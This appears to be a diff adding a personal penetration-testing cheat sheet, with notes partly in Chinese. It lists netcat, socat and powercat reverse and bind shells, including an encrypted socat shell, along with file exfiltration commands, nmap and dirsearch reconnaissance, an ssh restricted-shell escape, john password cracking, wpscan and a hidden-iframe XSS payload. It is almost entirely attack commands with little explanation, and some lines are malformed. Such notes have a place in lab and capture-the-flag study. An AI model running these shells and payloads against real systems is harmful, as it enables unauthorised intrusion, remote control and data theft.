@@ -1,1 +1,121 @@
 
+netcat
+    nc -nvlp 2233 -e /bin/bash   #the ccontroller
+        shell
+
+    nc -nv IP 2233 -e /bin/bash   #for controlled host
+        nc -nvlp 2233 # the ccontroller listening to wait the shell(reverse shell)
+    
+    python -c "import pty; pty.spawn ('/bin/bash')"  
+     python3 -c "import pty; pty.spawn ('/bin/bash')"  # to change for a better shell
+
+
+**********************************************************************
+
+socat
+
+    socat TCP4-LISTEN:2233 -   #host listioning on a port
+    socat - tcp:192.168.1.132:2233  # to connect the host
+
+    sudo socat TCP4-LISTEN:2233,fork file:test.sh # to share a specific file
+        socat - tcp:192.168.1.132:2233 # to sidplay the content of the  file
+            socat TCP:192.168.1.132:2233 file:new.file,create  #to get the file
+
+
+    socat -d -d TCP4-LISTEN:2233 -     #reverse shell on controlled host
+        socat TCP4:192.168.1.134:2233 EXEC:/bin/bash    #to connect the reverse shell
+
+    sudo socat OPENSSL-LISTEN:2233,cert=shell.pem,verify=0,fork EXEC:/bin/bash #encrypted shell
+        socat - OPENSSL:192.168.1.134:2233,verify=0  #to connect
+
+
+**********************************************************************
+powercat # nc on win
+
+    for linux listening
+        nc -nvlp 2233
+
+        powershell -c IP -p 
+
+    #transmission of files
+        sudo nc -nvlp > nameoffile.xx
+        #on win 
+            powercat -c IP -p -i C:\xxx.xx
+
+    # shell
+         sudo nc -nvlp > nameoffile.xx
+        #on win 
+            powercat -c IP -p -e cmd.EXEC
+
+    # reverseshell 
+        sudo nc -nvlp 2233 #controller
+            powercat -c IP -p xx -e powershell.exe(or cmd.exe) -g nameofscript.ps1
+
+  # enable a http server  
+sudo python3 -m http.server 2233
+
+**********************************************************************
+
+dict  # snap install seclists
+    /snap/seclists/discovery
+
+
+**********************************************************************
+nmap -sn 172.16.33.0/24        #scanning for live machine
+
+nmap -p- 172.16.3XX --open --reason  #scanning for live ports for a particular machine
+
+sudo nmap -p ****  -sV -A 172.16      # investigate the app of ports.
+
+
+
+    web
+        robots.txt
+        sitemap.xml
+        F12 前端代码，注释，脚本，路径，隐藏元素，CMS， Copyright Wordpress
+
+        direcroty discovery
+            dirsearch -u http://xxx
+ 
+            kali dicts
+                dirsearch -u http://xxx -w /usr/share/seclists/Discovery/Webcontent
+            dir disco hidden files
+                dirsearch -u http://xxx -e -f txt,php,html
+    
+    vuls searching
+        searchsploit xxx  # for a app or software middleware named XXX
+
+
+    rbash across
+        ssh xx@xxxxx "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+        ssh mindy@172.16.33.35  -t "bash --noprofile"
+
+
+    exp exploit
+        payload = 'nc  IP  2233 -e /bin/bash'
+
+            
+    #brute force zip
+        zip2john xx.zip > xx.hash     # to get the hash of the passwd
+        john xx.hash    # to brute the plaintext passw
+
+
+
+web
+    中文encode: url encode
+    #后台地址  Tomcat   /manager/html
+              phpMyadmin
+    
+    wpscan --url xxx                    #to exploit /wordpress directory
+
+    hakrawler  # search for the web direc
+
+    crAPI   #webAPi  tool
+
+    ssh -CNfg -L 80:127.0.0.1:8000  ed@IP   #80 dest port, 8000 the port to be forwarded
+                                            to map 127.0.0.1:8000 to 80
+
+    xss
+        <iframe src="http://IP" height="30" width="40"> </iframe> #height and width can be set as 0
+
+        <iframe src="http://192.168.1.140" height="30" width="40"> </iframe>
